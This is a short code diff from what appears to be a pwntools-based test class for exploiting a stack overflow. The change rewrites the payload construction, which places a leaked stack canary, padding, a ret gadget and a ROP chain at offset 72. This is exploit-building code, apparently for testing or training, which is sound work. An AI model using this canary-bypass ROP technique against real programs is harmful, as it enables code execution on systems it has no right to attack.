@@ -168,12 +168,9 @@ class FormatStringBypassCanaryTest(ROPTest):
         log.info(f"ROP chain:\n{rop.dump()}")
         RET = rop.find_gadget(['ret'])[0]
 
-        buffer_size = 64
-        padding = b'A' * buffer_size
-        padding += p64(canary)
-        padding += b'B' * 16
-
-        payload = padding + p64(RET) + rop.chain()
+        payload = flat({
+            72: p64(canary) + b'B' * 8 + p64(RET) + rop.chain()
+        })
 
         log.info(payload)
 
